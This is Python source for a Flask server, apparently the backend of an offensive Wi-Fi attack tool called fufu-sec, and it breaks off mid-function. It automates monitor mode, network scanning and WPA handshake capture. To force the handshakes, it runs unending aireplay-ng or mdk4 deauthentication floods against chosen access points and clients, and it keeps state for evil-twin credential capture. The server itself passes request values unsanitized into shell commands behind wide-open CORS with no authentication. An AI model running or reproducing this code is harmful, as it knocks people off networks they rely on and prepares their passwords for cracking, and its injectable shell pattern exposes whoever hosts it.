#!/usr/bin/env python3
"""
fufu-sec — Framework for Uninvited Frequency Usage
by kyllr-qwen · https://github.com/kyllr-qwen/fufu-sec

Run from the fufu-sec folder (no global install needed):
  sudo python3 server.py
Then open: http://localhost:5000
"""

import os, subprocess, threading, time, json, re, shutil
import logging, logging.handlers
from datetime import datetime, timezone
from flask import Flask, request, jsonify, g
from flask_cors import CORS

# ─── LOGGING SETUP ────────────────────────────────────────────────────────────

# ─── PATHS ────────────────────────────────────────────────────────────────────
# Everything stays inside the fufu-sec folder — no global install required.
# Deleting this folder removes fufu-sec completely from the system.

_BASE_DIR = os.path.dirname(os.path.realpath(__file__))   # the fufu-sec folder
LOG_DIR   = os.path.join(_BASE_DIR, "logs")               # fufu-sec/logs/
TMPDIR    = "/tmp/fufu-sec/"                               # capture/temp files

os.makedirs(TMPDIR,  exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

def _setup_logging():
    fmt    = logging.Formatter("%(asctime)s  [%(levelname)s]  %(message)s",
                               datefmt="%Y-%m-%d %H:%M:%S")
    logger = logging.getLogger("fufu-sec")
    logger.setLevel(logging.DEBUG)
    try:
        fh = logging.handlers.RotatingFileHandler(
            os.path.join(LOG_DIR, "fufu-sec.log"), maxBytes=5*1024*1024, backupCount=5)
        fh.setFormatter(fmt)
        logger.addHandler(fh)
    except Exception:
        pass
    ch = logging.StreamHandler()
    ch.setFormatter(fmt)
    logger.addHandler(ch)
    return logger

log = _setup_logging()

# ─── AUDIT LOG (no auth required — just records actions) ─────────────────────

_audit_lock   = threading.Lock()
_audit_buffer = []

def audit(action, detail="", level="INFO"):
    try:
        ip = request.remote_addr if request else "—"
    except RuntimeError:
        ip = "—"
    entry = {"ts": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
             "action": action, "detail": str(detail)[:300],
             "level": level, "ip": ip}
    with _audit_lock:
        _audit_buffer.append(entry)
        if len(_audit_buffer) > 500:
            _audit_buffer.pop(0)
    try:
        with open(os.path.join(LOG_DIR, "audit.log"), "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        pass
    log.info(f"AUDIT [{ip}] {action}  {detail}")


# ─── FLASK SETUP ──────────────────────────────────────────────────────────────

app = Flask(__name__)
CORS(app)   # Wide-open CORS — dashboard.html works from file:// or any port/origin


# ─── RATE LIMITING ───────────────────────────────────────────────────────────

_rate_lock  = threading.Lock()
_rate_table = {}

def _rate_ok(ip, limit=120, window=60):
    now = time.time()
    with _rate_lock:
        ts = [t for t in _rate_table.get(ip, []) if now - t < window]
        if len(ts) >= limit:
            return False
        ts.append(now)
        _rate_table[ip] = ts
    return True

@app.before_request
def before_request():
    ip = request.remote_addr or "0.0.0.0"
    if not _rate_ok(ip):
        return jsonify({"error": "Rate limit exceeded — slow down"}), 429
    g.request_start = time.time()

@app.after_request
def after_request(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"]         = "SAMEORIGIN"
    dur = time.time() - getattr(g, "request_start", time.time())
    if dur > 2.0:
        log.warning(f"Slow request: {request.path}  {dur:.2f}s")
    return response


# ─── GLOBAL STATE ─────────────────────────────────────────────────────────────

_proc_lock = threading.Lock()   # guards active_processes (BUG-017 fix)

state = {
    "interface":            None,
    "monitor_interface":    None,
    "mode":                 "managed",
    "scan_results":         [],
    "scanning":             False,
    "capture_process":      None,
    "clients":              [],
    "eviltwin_process":     None,
    "eviltwin_clients":     0,
    "eviltwin_credentials": [],
    "active_processes":     {},
}


# ─── HANDSHAKE VERIFICATION HELPERS (fufu-sec-faithful) ─────────────────────

def _strip_ansi(text):
    text = re.sub(r"\x1b(?:[@-Z\\-_]|\[[0-9;?]*[ -/]*[@-~])", "", text)
    return text.replace("\r", "")

def _tshark_eapol_count(capfile, bssid="", timeout_sec=4):
    """
    Fast EAPOL frame count via tshark — fufu-sec uses this as a pre-check
    before invoking aircrack-ng on the live (open) .cap file.
    Returns the number of EAPOL frames matching the BSSID filter (0 if none / error).
    A value >= 2 is a strong indicator of a handshake.
    """
    if not tool_exists("tshark"):
        return 0
    bssid_filter = f" && (wlan.addr=={bssid})" if bssid else ""
    cmd = (f"timeout {timeout_sec} tshark -r \"{capfile}\" "
           f"-Y \"eapol{bssid_filter}\" -T fields -e frame.number "
           f"2>/dev/null | wc -l")
    try:
        out, _, _ = run_cmd(cmd, timeout=timeout_sec + 2)
        return int(out.strip())
    except Exception:
        return 0

def _ac_verify(capfile, bssid="", timeout_sec=20):
    if not capfile or not os.path.exists(capfile):
        return False, "(file not found)", ""
    sz = os.path.getsize(capfile)
    if sz < 1024:
        return False, f"(file too small: {sz} bytes)", ""
    try:
        proc = subprocess.Popen(
            f"echo '1' | timeout -s SIGTERM {timeout_sec} aircrack-ng \"{capfile}\" 2>&1",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, preexec_fn=os.setsid)
        raw, _ = proc.communicate(timeout=timeout_sec + 5)
    except subprocess.TimeoutExpired:
        try: os.killpg(os.getpgid(proc.pid), 9)
        except: pass
        return False, "(aircrack-ng timed out)", ""
    except Exception as e:
        return False, f"(error: {e})", ""
    out = _strip_ansi(raw)
    if not re.search(r"WPA \([1-9][0-9]? handshake", out):
        return False, out, out
    if bssid:
        bssid_up = bssid.upper()
        for line in out.splitlines():
            lc = _strip_ansi(line)
            if re.search(r"WPA \([1-9][0-9]? handshake", lc) and bssid_up in lc.upper():
                return True, out, out
        return False, out, f"(handshake present but BSSID {bssid} not matched)"
    return True, out, out

def _ac_wpa2_check(capfile, bssid=""):
    if not capfile or not os.path.exists(capfile): return False
    b_flag = f"-b {bssid}" if bssid else ""
    _, _, rc = run_cmd(f"aircrack-ng -a 2 {b_flag} -w \"{capfile}\" \"{capfile}\" > /dev/null 2>&1", timeout=20)
    return rc == 0


# ─── UTILITIES ────────────────────────────────────────────────────────────────

def run_cmd(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return p.stdout, p.stderr, p.returncode
    except subprocess.TimeoutExpired: return "", "Command timed out", 1
    except Exception as e: return "", str(e), 1

def run_bg(name, cmd):
    kill_bg(name)
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True, preexec_fn=os.setsid)
    with _proc_lock:
        state["active_processes"][name] = proc
    log.debug(f"run_bg [{name}] PID={proc.pid}")
    return proc

def kill_bg(name):
    with _proc_lock:
        proc = state["active_processes"].get(name)
        if proc:
            try: os.killpg(os.getpgid(proc.pid), 9)
            except: pass
            state["active_processes"].pop(name, None)

def read_output(proc, timeout=30):
    lines = []; deadline = time.time() + timeout
    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None: break
            time.sleep(0.1); continue
        lines.append(line.rstrip())
        if len(lines) > 500: break
    return "\n".join(lines)

def tool_exists(tool):
    if shutil.which(tool): return True
    extra = ["/usr/sbin","/sbin","/usr/local/sbin","/usr/bin","/usr/local/bin","/usr/lib/aircrack-ng"]
    for p in extra:
        if os.path.isfile(os.path.join(p, tool)): return True
    # Tool name → possible binary names on different distros
    aliases = {
        "beef":           ["beef-xss", "beef"],
        "dhcpd":          ["dhcpd", "isc-dhcp-server"],
        "john":           ["john", "john-the-ripper"],
        "openssl":        ["openssl"],
        "packetforge-ng": ["packetforge-ng"],
        "hostapd-wpe":    ["hostapd-wpe", "hostapd_wpe"],
        "asleap":         ["asleap"],
        "hcxpcapngtool":  ["hcxpcapngtool"],
        "hcxdumptool":    ["hcxdumptool"],
        "besside-ng":     ["besside-ng"],
        "hostapd-mana":   ["hostapd-mana", "hostapd_mana"],
    }
    # Also check Kali-specific locations for tools that land in unusual paths
    kali_paths = ["/usr/lib/aircrack-ng", "/usr/lib/x86_64-linux-gnu", "/opt"]
    extra = extra + kali_paths
    for alt in aliases.get(tool,[]):
        if shutil.which(alt): return True
        for p in extra:
            if os.path.isfile(os.path.join(p, alt)): return True
    out, _, rc = run_cmd(f"which {tool} 2>/dev/null || command -v {tool} 2>/dev/null")
    return rc == 0 and bool(out.strip())

def get_active_iface():
    return state["monitor_interface"] or state["interface"]

def _clean_iface_name(raw):
    if not raw: return raw
    return re.sub(r"^\[phy\d+\]", "", raw.strip().rstrip(")")).strip()

def _safe_path(path, base=TMPDIR):
    try: return os.path.realpath(path).startswith(os.path.realpath(base))
    except: return False


# ─── ROUTES ───────────────────────────────────────────────────────────────────

@app.route("/api/status")
def status():
    return jsonify({"online": True, "interface": get_active_iface(),
                    "mode": state["mode"], "monitor_interface": state["monitor_interface"],
                    "version": "3.0.0"})


@app.route("/api/health")
def health():
    disk_out, _, _ = run_cmd("df -h /tmp | awk 'NR==2{print $5}' | tr -d '%'")
    disk_pct = int(disk_out.strip()) if disk_out.strip().isdigit() else -1
    mem_out, _, _  = run_cmd("free -m | awk 'NR==2{printf \"%s %s\", $2,$3}'")
    mp = mem_out.strip().split()
    mem_total = int(mp[0]) if mp else 0; mem_used = int(mp[1]) if len(mp) > 1 else 0
    mem_pct = round(mem_used / mem_total * 100) if mem_total else 0
    with _proc_lock:
        active_count = sum(1 for v in state["active_processes"].values() if v.poll() is None)
    return jsonify({"status": "ok" if disk_pct < 90 and mem_pct < 95 else "degraded",
                    "checks": {"disk_tmp_pct": disk_pct, "disk_ok": disk_pct < 90,
                               "mem_pct": mem_pct, "mem_ok": mem_pct < 95,
                               "tools_ok": all(tool_exists(t) for t in ["aircrack-ng","airodump-ng","airmon-ng"]),
                               "iface": get_active_iface() or "none",
                               "active_procs": active_count},
                    "ts": datetime.now(timezone.utc).isoformat()})


@app.route("/api/audit/log")
def audit_log():
    n = min(int(request.args.get("n", 100)), 500)
    with _audit_lock:
        entries = list(_audit_buffer[-n:])
    return jsonify({"entries": entries, "total": len(_audit_buffer)})


@app.route("/api/interfaces")
def interfaces():
    stdout, _, _ = run_cmd("iw dev")
    ifaces, current = [], {}
    for line in stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            if current: ifaces.append(current)
            current = {"name": line.split()[-1], "mode": "managed", "driver": "", "chipset": ""}
        elif "type" in line and current:
            current["mode"] = line.split()[-1]
    if current: ifaces.append(current)
    for i in ifaces:
        # Driver from uevent
        out, _, _ = run_cmd(f"cat /sys/class/net/{i['name']}/device/uevent 2>/dev/null | grep DRIVER")
        for line in out.splitlines():
            if "DRIVER=" in line: i["driver"] = line.split("=")[-1].strip()
        # MAC address from sysfs
        mac_out, _, _ = run_cmd(f"cat /sys/class/net/{i['name']}/address 2>/dev/null")
        i["mac"] = mac_out.strip() or "?"
    if not ifaces:
        stdout2, _, _ = run_cmd("ip link show")
        for line in stdout2.splitlines():
            m = re.match(r"\d+: (\w+):", line)
            if m and m.group(1) not in ("lo","eth0","ens","enp"):
                ifaces.append({"name": m.group(1), "mode": "?", "driver": "", "chipset": ""})
    return jsonify({"interfaces": ifaces})


@app.route("/api/monitor/enable", methods=["POST"])
def monitor_enable():
    data    = request.json or {}
    iface   = (data.get("interface") or "").strip() or state.get("interface") or ""
    channel = (data.get("channel") or "").strip()
    if not iface:
        return jsonify({"error": "No interface specified — enter the interface name first"})
    audit("MONITOR_ENABLE", f"iface={iface} ch={channel or 'any'}")
    log_lines = []
    log_lines.append("[*] Running: airmon-ng check kill")
    kill_out, _, _ = run_cmd("airmon-ng check kill", timeout=15)
    if kill_out.strip(): log_lines.append(kill_out.strip())
    time.sleep(1)
    cmd = f"airmon-ng start {iface} {channel}".strip()
    log_lines.append(f"[*] Running: {cmd}")
    stdout, stderr, rc = run_cmd(cmd, timeout=60)
    combined = stdout + stderr
    log_lines.append(combined.strip() if combined.strip() else "(no output)")
    mon_iface = None
    patterns = [r"monitor mode (?:vif )?enabled (?:for .+ )?on (.+?)[\)\s]",
                r"monitor mode (?:already )?enabled on (\S+)",
                r"\(mac80211 monitor mode vif enabled for .+? on (\S+)\)",
                r"^\s*(\S+)\s+\(mac80211 monitor",
                r"Interface\s+(\S+mon\S*)"]
    for line in combined.splitlines():
        for pat in patterns:
            m = re.search(pat, line, re.IGNORECASE)
            if m:
                candidate = _clean_iface_name(m.group(1))
                if candidate and len(candidate) > 1:
                    mon_iface = candidate
                    log_lines.append(f"[*] Detected: {mon_iface}")
                    break
        if mon_iface: break
    iw_out, _, _ = run_cmd("iw dev", timeout=10)
    cur_b = None
    for line in iw_out.splitlines():
        line = line.strip()
        m = re.match(r"Interface\s+(\S+)", line)
        if m: cur_b = _clean_iface_name(m.group(1))
        if "type monitor" in line.lower() and cur_b:
            if not mon_iface or mon_iface != cur_b:
                log_lines.append(f"[*] iw dev {'detects' if not mon_iface else 'overrides to'}: {cur_b}")
                mon_iface = cur_b
            break
    if not mon_iface:
        for c in [iface+"mon", iface+"mon0", "mon0", "wlan0mon", "wlan1mon"]:
            chk, _, _ = run_cmd(f"iw dev {c} info 2>/dev/null", timeout=5)
            if "type monitor" in chk.lower() or "wiphy" in chk.lower():
                mon_iface = c; log_lines.append(f"[*] Found by probe: {mon_iface}"); break
    if not mon_iface:
        mon_iface = iface + "mon"
        log_lines.append(f"[!] Could not auto-detect — assuming: {mon_iface}")
    mon_iface = _clean_iface_name(mon_iface)
    log_lines.append(f"[*] Final monitor interface: {mon_iface}")
    state["monitor_interface"] = mon_iface; state["mode"] = "monitor"; state["interface"] = iface
    return jsonify({"success": f"Monitor mode enabled on {mon_iface}", "new_interface": mon_iface,
                    "output": "\n".join(log_lines), "log": log_lines})


@app.route("/api/monitor/disable", methods=["POST"])
def monitor_disable():
    data = request.json or {}
    iface = data.get("interface") or state["monitor_interface"] or state["interface"]
    if not iface: return jsonify({"error": "No interface specified"})
    audit("MONITOR_DISABLE", f"iface={iface}")
    stdout, stderr, _ = run_cmd(f"airmon-ng stop {iface}")
    run_cmd("service NetworkManager restart 2>/dev/null || nmcli networking on 2>/dev/null || true")
    state["monitor_interface"] = None; state["mode"] = "managed"
    return jsonify({"success": f"Monitor mode disabled on {iface}", "output": stdout+stderr})


# ── SCAN ──────────────────────────────────────────────────────────────────────

def parse_airodump(csv_file):
    networks = []
    if not os.path.exists(csv_file): return networks
    try:
        with open(csv_file, encoding="latin-1") as f: lines = f.readlines()
    except Exception: return networks
    in_ap = False
    for line in lines:
        line = line.rstrip("\n")
        if line.strip().startswith("BSSID"):  in_ap = True;  continue
        if line.strip() == "":               in_ap = False; continue
        if not in_ap: continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14: continue
        bssid = parts[0].strip()
        if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid): continue
        try:
            ssid_parts = parts[13:]
            if ssid_parts and ssid_parts[-1] == "": ssid_parts = ssid_parts[:-1]
            ssid = ",".join(ssid_parts).strip()
            networks.append({"bssid": bssid, "ssid": ssid, "channel": parts[3].strip(),
                             "power": parts[8].strip(), "enc": parts[5].strip(),
                             "cipher": parts[6].strip(), "auth": parts[7].strip(),
                             "beacons": parts[9].strip(), "clients": 0, "wps": False})
        except Exception: continue
    return networks


@app.route("/api/scan/start", methods=["POST"])
def scan_start():
    data = request.json or {}
    band = data.get("band","bg"); stime = int(data.get("time",20)); clear = data.get("clear",False)
    iface = get_active_iface()
    if not iface: return jsonify({"error": "No monitor interface — enable monitor mode first"})
    if clear: state["scan_results"] = []
    for f in os.listdir(TMPDIR):
        if f.startswith("scan-"):
            try: os.remove(os.path.join(TMPDIR, f))
            except: pass
    band_arg = "--band bg" if band == "bg" else "--band abg" if band == "5ghz" else ""
    proc = run_bg("scan", f"airodump-ng {band_arg} -w {TMPDIR}scan --output-format csv {iface}")
    state["scanning"] = True
    audit("SCAN_START", f"iface={iface} band={band} time={stime}s")
    def _stop():
        time.sleep(stime); kill_bg("scan"); time.sleep(0.5)
        nets = parse_airodump(TMPDIR+"scan-01.csv")
        if nets: state["scan_results"] = nets
        state["scanning"] = False
    threading.Thread(target=_stop, daemon=True).start()
    if proc.poll() is not None:
        state["scanning"] = False
        return jsonify({"error": f"airodump-ng failed to start on '{iface}' — is monitor mode active?"})
    return jsonify({"success": f"Scan started on {iface} for {stime}s", "time": stime})


@app.route("/api/scan/results")
def scan_results():
    csv = TMPDIR+"scan-01.csv"; nets = state["scan_results"]
    if state["scanning"] and os.path.exists(csv):
        live = parse_airodump(csv)
        if live: nets = live; state["scan_results"] = live
    return jsonify({"networks": nets, "scanning": state["scanning"], "count": len(nets)})


@app.route("/api/scan/stop", methods=["POST"])
def scan_stop():
    kill_bg("scan"); state["scanning"] = False
    return jsonify({"success": "Scan stopped"})


@app.route("/api/capture/start", methods=["POST"])
def capture_start():
    data = request.json or {}
    bssid   = (data.get("bssid") or "").strip(); channel = (data.get("channel") or "").strip()
    output  = data.get("output", TMPDIR+"capture").strip(); iface = get_active_iface()
    if not iface: return jsonify({"error": "No monitor interface"})
    if not output or not _safe_path(output, "/tmp/fufu-sec"): output = TMPDIR+"capture"
    b_flag = f"-d {bssid}" if bssid else ""; c_flag = f"-c {channel}" if channel else ""
    fmt = data.get("format","pcap,csv") or "pcap,csv"
    run_bg("capture", f"airodump-ng {b_flag} {c_flag} -w {output} --output-format {fmt} {iface}")
    state["last_csv_file"] = output+"-01.csv"
    if bssid: audit("CAPTURE_START", f"bssid={bssid} ch={channel}")
    return jsonify({"success": f"Capture started on {iface}", "output": f"[*] Capturing → {output}-01.cap"})


@app.route("/api/capture/capstatus")
def capture_status():
    cap_file = state.get("last_cap_file", TMPDIR+"handshake-01.cap")
    csv_file = state.get("last_csv_file","")
    cap_size = os.path.getsize(cap_file) if os.path.exists(cap_file) else 0
    clients, seen_macs = [], set()
    if os.path.exists(csv_file):
        try:
            with open(csv_file, encoding="latin-1") as f:
                in_sta = False
                for line in f:
                    line = line.strip()
                    if "Station MAC" in line: in_sta = True; continue
                    if not in_sta or not line: continue
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) > 5:
                        mac = parts[0]
                        if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac) and mac not in seen_macs:
                            seen_macs.add(mac)
                            assoc = parts[5].strip() if len(parts) > 5 else ""
                            clients.append(f"{mac}" + (f" → {assoc}" if assoc else ""))
        except: pass
    has_hs = False
    if cap_size >= 1024:
        ok, _, _ = _ac_verify(cap_file, state.get("last_bssid",""))
        has_hs = ok
    hs_msg = "FOUND ✓" if has_hs else ("Capturing..." if state.get("handshake_running") else "Idle")
    return jsonify({"running": state.get("handshake_running",False), "found": has_hs,
                    "cap_file": cap_file, "cap_size": cap_size, "packets": 0,
                    "clients": clients, "client_count": len(clients),
                    "status": hs_msg, "error": None})


@app.route("/api/capture/stop", methods=["POST"])
def capture_stop():
    kill_bg("capture"); kill_bg("handshake_cap")
    return jsonify({"success": "Capture stopped"})


# ── HANDSHAKE ────────────────────────────────────────────────────────────────

@app.route("/api/handshake/capture", methods=["POST"])
def handshake_capture():
    data    = request.json or {}
    bssid   = (data.get("bssid") or "").strip().upper()
    channel = str((data.get("channel") or "")).strip()
    client  = (data.get("client") or "").strip().upper()
    timeout = int(data.get("timeout", 30))
    iface   = get_active_iface()

    if not bssid or not channel:
        return jsonify({"error": "BSSID and channel required"})
    if not iface:
        return jsonify({"error": "No monitor interface. Enable monitor mode first."})
    if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
        return jsonify({"error": f"Invalid BSSID: {bssid}"})

    # ── Pre-capture validation ────────────────────────────────────────────────
    # Kills false-start errors before airodump is launched.
    pre_diag = []
    iw_check, _, iw_rc = run_cmd(f"iw dev {iface} info 2>&1", timeout=5)
    if iw_rc != 0 or not iw_check.strip():
        pre_diag.append(f"Interface '{iface}' not found. Run 'iw dev' to list interfaces.")
        pre_diag.append("If you recently enabled monitor mode, the interface may have been renamed.")
        pre_diag.append(f"Try: airmon-ng start wlan0 (check output for new interface name)")
        return jsonify({"error": f"Interface '{iface}' not found", "output": "\n".join(pre_diag)})

    if "type monitor" not in iw_check.lower():
        mode_line = next((l.strip() for l in iw_check.splitlines() if "type" in l.lower()), "unknown")
        return jsonify({"error": f"'{iface}' is not in monitor mode ({mode_line}). Enable monitor mode first."})

    # Check rfkill
    rfkill_out, _, _ = run_cmd("rfkill list 2>/dev/null", timeout=5)
    if "Soft blocked: yes" in rfkill_out:
        run_cmd("rfkill unblock wifi 2>/dev/null; rfkill unblock all 2>/dev/null", timeout=5)
        log.info(f"rfkill unblocked before handshake capture on {iface}")

    # Ensure interface is UP
    run_cmd(f"ip link set {iface} up 2>/dev/null", timeout=5)

    # Kill any stale capture processes that may be holding the interface
    kill_bg("capture"); kill_bg("handshake_cap"); time.sleep(0.3)

    # PMF detection: check if AP has PMF enabled (frame cap: RSN MFPR/MFPC bits)
    # We use tshark to inspect the last scan CSV beacon flags if available
    # Store as advisory — still attempt capture but warn user
    pmf_detected = False
    scan_nets = state.get("scan_results", [])
    bssid_upper = bssid.upper()
    target_net = next((n for n in scan_nets if n.get("bssid","").upper() == bssid_upper), None)
    if target_net:
        auth = target_net.get("auth","").upper()
        enc  = target_net.get("enc","").upper()
        # WPA3/SAE always uses PMF; WPA2-MGT often does too
        if "SAE" in auth or "WPA3" in enc or "MGT" in auth:
            pmf_detected = True
            log.info(f"PMF likely on {bssid} (auth={auth} enc={enc})")
    # ─────────────────────────────────────────────────────────────────────────

    _BROADCAST = "FF:FF:FF:FF:FF:FF"
    if not client or not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", client) or client == _BROADCAST:
        client = ""

    audit("HANDSHAKE_START", f"bssid={bssid} ch={channel}")

    # BUG-023 fix: extended range + timestamp fallback
    def _next_prefix():
        for i in range(1, 10000):
            if not os.path.exists(TMPDIR+f"hs{i}-01.cap"):
                return TMPDIR+f"hs{i}", TMPDIR+f"hs{i}-01.cap", TMPDIR+f"hs{i}-01.csv"
        ts = int(time.time())
        return TMPDIR+f"hs_t{ts}", TMPDIR+f"hs_t{ts}-01.cap", TMPDIR+f"hs_t{ts}-01.csv"

    cap_prefix, cap_file, csv_file = _next_prefix()
    cap_num = cap_prefix.split("hs")[-1]
    display_name = f"handshake-{cap_num}.cap"

    run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
            f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)

    dump_cmd  = f"airodump-ng -c {channel} -d {bssid} --write-interval 1 -w {cap_prefix} {iface}"
    dump_proc = run_bg("handshake_cap", dump_cmd)
    time.sleep(1.5)
    if dump_proc.poll() is not None:
        # Read whatever stderr airodump printed before dying
        try:
            early_err = dump_proc.stdout.read(400).strip() if dump_proc.stdout else ""
        except Exception:
            early_err = ""
        diag = [
            f"airodump-ng exited immediately on '{iface}'.",
            "",
            "Diagnosis checklist:",
            f"  1. Verify interface is still in monitor mode: iw dev {iface} info",
            f"  2. Test injection support: aireplay-ng --test {iface}",
            "  3. Check for rfkill block: rfkill list",
            "  4. Check driver errors: dmesg | tail -20",
            "  5. Try re-enabling monitor mode: airmon-ng stop {iface} && airmon-ng start wlan0",
        ]
        if early_err:
            diag.append(f"\nairodump-ng output: {early_err[:300]}")
        return jsonify({"error": "\n".join(diag)})

    state.update({"last_cap_file": cap_file, "last_cap_prefix": cap_prefix,
                  "last_csv_file": csv_file, "last_bssid": bssid,
                  "handshake_running": True, "handshake_found": False,
                  "handshake_result": "running", "hs_log": []})

    def _log(msg):
        state["hs_log"].append(msg)
        log.debug(f"hs_worker: {msg}")

    log_lines = [
        f"[*] Interface  : {iface}",
        f"[*] Target     : {bssid}  CH{channel}",
        f"[*] Client     : {client or 'broadcast (FF:FF:FF:FF:FF:FF)'}",
        f"[*] PMF detect : {'⚠ LIKELY (WPA3/SAE/MGT — deauth may be ignored)' if pmf_detected else 'Not detected (WPA2 standard deauth should work)'}",
        f"[*] Output file: {cap_file}  (shown as {display_name})",
        f"[*] airodump   : {dump_cmd}",
        f"[*] airodump-ng started (PID {dump_proc.pid})",
        f"[*] Timeout    : {timeout}s  |  Deauth starts in 2s...",
    ]

    def _full_verify(filepath):
        ok, raw, _ = _ac_verify(filepath, bssid)
        if not ok:
            _log(f"[-] Verify failed: {raw[:120] if raw else 'no output'}")
            return False
        if not _ac_wpa2_check(filepath, bssid):
            _log("[!] WPA2 secondary check failed — may be WPA1/TKIP (still crackable)")
        return True

    def hs_worker():
        current_cap = cap_file; current_prefix = cap_prefix
        deauth_stop = threading.Event()

        def _deauth_loop():
            time.sleep(2)
            bl_file = TMPDIR+"bl.txt"
            try:
                with open(bl_file, "w") as f: f.write(bssid+"\n")
            except: pass
            run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
                    f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)
            burst = 0; working_cmd = None

            def _try_aireplay(cmd, label):
                try:
                    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, text=True, preexec_fn=os.setsid)
                    # Fast check (0.3s) — if it dies immediately the adapter can't inject
                    deauth_stop.wait(0.3)
                    if p.poll() is not None:
                        try: err = p.stdout.read(300).strip()
                        except: err = ""
                        _log(f"[!] aireplay-ng ({label}) exited immediately: {err[:120] if err else 'no output'}")
                        return None
                    return p   # still alive → injection is working
                except Exception as e:
                    _log(f"[!] aireplay-ng launch ({label}): {e}"); return None

            while not deauth_stop.is_set():
                burst += 1
                # Re-lock channel before every burst (airodump channel scanning can drift)
                run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
                        f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=3)
                c_flag = f"-c {client} " if (client and client.upper() != _BROADCAST) else ""
                if tool_exists("aireplay-ng"):
                    proc = None
                    if working_cmd is None:
                        cmd1 = f"aireplay-ng --deauth 0 -a {bssid} {c_flag}--ignore-negative-one {iface}"
                        proc = _try_aireplay(cmd1, "tier1")
                        if proc: working_cmd = cmd1; _log("[*] Deauth running (tier 1)")
                        else:
                            cmd2 = f"aireplay-ng --deauth 0 -a {bssid} {c_flag}{iface}"
                            proc = _try_aireplay(cmd2, "tier2")
                            if proc: working_cmd = cmd2; _log("[*] Deauth running (tier 2)")
                            else:
                                cmd3 = f"aireplay-ng -0 0 -a {bssid} {c_flag}{iface}"
                                proc = _try_aireplay(cmd3, "tier3")
                                if proc: working_cmd = cmd3; _log("[*] Deauth running (tier 3)")
                                else:
                                    working_cmd = "FAILED"
                                    _log("[!] All aireplay-ng variants failed")
                                    _log(f"    Verify injection: aireplay-ng --test {iface}")
                    else:
                        if working_cmd != "FAILED":
                            try:
                                proc = subprocess.Popen(working_cmd, shell=True,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    preexec_fn=os.setsid)
                                deauth_stop.wait(1.5)
                                if proc.poll() is not None:
                                    _log(f"[!] Deauth exited on burst {burst} — re-probing")
                                    working_cmd = None; proc = None
                            except: proc = None
                    if proc and proc.poll() is None:
                        deauth_stop.wait(7)   # 7s burst (was 12s) — faster handshake triggering
                        try: os.killpg(os.getpgid(proc.pid), 9)
                        except: pass
                        continue
                    if tool_exists("mdk4"):
                        da_cmd = f"mdk4 {iface} d -b {bl_file} -c {channel}"
                        try:
                            proc = subprocess.Popen(da_cmd, shell=True, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                            if burst == 1: _log(f"[*] mdk4 deauth fallback")
                        except Exception as e:
                            _log(f"[!] mdk4 failed: {e}"); return
                        deauth_stop.wait(7)   # 7s burst
                        try: os.killpg(os.getpgid(proc.pid), 9)
                        except: pass
                    else:
                        if burst == 1: _log("[!] aireplay-ng failed and mdk4 not installed")
                        deauth_stop.wait(10)
                elif tool_exists("mdk4"):
                    da_cmd = f"mdk4 {iface} d -b {bl_file} -c {channel}"
                    try:
                        proc = subprocess.Popen(da_cmd, shell=True, stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
                        if burst == 1: _log(f"[*] mdk4: {da_cmd}")
                    except Exception as e:
                        _log(f"[!] mdk4 error: {e}"); return
                    deauth_stop.wait(7)
                    try: os.killpg(os.getpgid(proc.pid), 9)
                    except: pass
                else:
                    _log("[!] Neither aireplay-ng nor mdk4 found"); return

        threading.Thread(target=_deauth_loop, daemon=True).start()

        def _next_prefix_local():
            for i in range(1, 10000):
                if not os.path.exists(TMPDIR+f"hs{i}-01.cap"):
                    return TMPDIR+f"hs{i}", TMPDIR+f"hs{i}-01.cap", TMPDIR+f"hs{i}-01.csv"
            ts = int(time.time())
            return TMPDIR+f"hs_t{ts}", TMPDIR+f"hs_t{ts}-01.cap", TMPDIR+f"hs_t{ts}-01.csv"

        def _restart_airodump(reason):
            nonlocal current_cap, current_prefix
            _log(f"[~] {reason} — restarting airodump on new prefix")
            kill_bg("handshake_cap"); time.sleep(1.2)  # give kernel time to release interface
            new_prefix, new_cap, new_csv = _next_prefix_local()
            current_prefix = new_prefix; current_cap = new_cap
            state["last_cap_file"] = new_cap; state["last_csv_file"] = new_csv
            run_bg("handshake_cap", f"airodump-ng -c {channel} -d {bssid} --write-interval 1 -w {new_prefix} {iface}")
            _log(f"[*] New capture file: {new_cap}")

        def _confirm_and_finish(filepath):
            deauth_stop.set(); kill_bg("handshake_cap"); time.sleep(2.0)
            _log(f"[*] Verifying closed file: {filepath}")
            if _full_verify(filepath):
                state.update({"handshake_found": True, "handshake_result": "CAPTURED",
                              "last_cap_file": filepath})
                _log(f"[+] ✓ HANDSHAKE CONFIRMED: {filepath}")
                audit("HANDSHAKE_CAPTURED", f"bssid={bssid} file={filepath}")
                return True
            _log("[-] Closed-file re-verify failed (false positive) — resuming")
            return False

        elapsed = 0
        while elapsed < timeout:
